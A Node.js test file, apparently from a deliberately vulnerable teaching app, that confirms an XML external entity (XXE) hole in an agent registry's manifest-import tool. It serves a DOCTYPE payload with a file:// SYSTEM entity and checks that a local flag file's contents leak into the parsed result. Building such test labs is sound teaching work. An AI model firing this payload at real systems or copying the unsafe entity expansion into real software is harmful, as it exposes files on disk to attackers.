/**
 * @intentional-vulnerability xxe-import-manifest
 * @teaches OWASP-Web:A05
 * @location agent-host/agents/mcp-registry/tools/index.js
 *
 * import_manifest fetches XML and expands DOCTYPE entities before xml2js
 * parses it. A file:// SYSTEM entity resolves to real file contents on disk.
 */

const { seedAgents } = require('../_fixture.js');
const test = require('node:test');
const assert = require('node:assert/strict');
const path = require('node:path');
const fs = require('node:fs');
const os = require('node:os');
const http = require('node:http');

test('xxe-import-manifest: DOCTYPE ENTITY file:// resolves and leaks disk content', async (t) => {
  const a = await seedAgents();
  t.after(() => a.close());
  const dir = fs.mkdtempSync(path.join(os.tmpdir(), 'ss-xxe-'));

  const secretPath = path.join(dir, 'target.txt');
  fs.writeFileSync(secretPath, 'DV-AI{xxe-import-manifest}');
  try {

    for (const k of Object.keys(require.cache)) {
      if (k.includes('/agent-host/agents/mcp-registry/')) delete require.cache[k];
    }
    const { import_manifest } = require(path.resolve(__dirname, '../../../../agent-host/agents/mcp-registry/tools/index.js'));

    const xml = `<?xml version="1.0"?>
<!DOCTYPE root [<!ENTITY xxe SYSTEM "file://${secretPath}">]>
<manifest><label>&xxe;</label></manifest>`;

    const srv = http.createServer((req, res) => {
      res.writeHead(200, { 'content-type': 'application/xml' });
      res.end(xml);
    });
    await new Promise(r => srv.listen(0, '127.0.0.1', r));
    try {
      const r = await import_manifest({ xml_url: `http://127.0.0.1:${srv.address().port}/manifest.xml` });
      assert.equal(r.ok, true);
      const rendered = JSON.stringify(r.xml_doc);
      assert.ok(rendered.includes('DV-AI{xxe-import-manifest}'),
        'file:// SYSTEM entity resolved into the parsed XML doc');
    } finally {
      await new Promise(r => srv.close(r));
    }
  } finally {

    try { fs.rmSync(dir, { recursive: true, force: true }); } catch {}
    await a.close();
  }
});
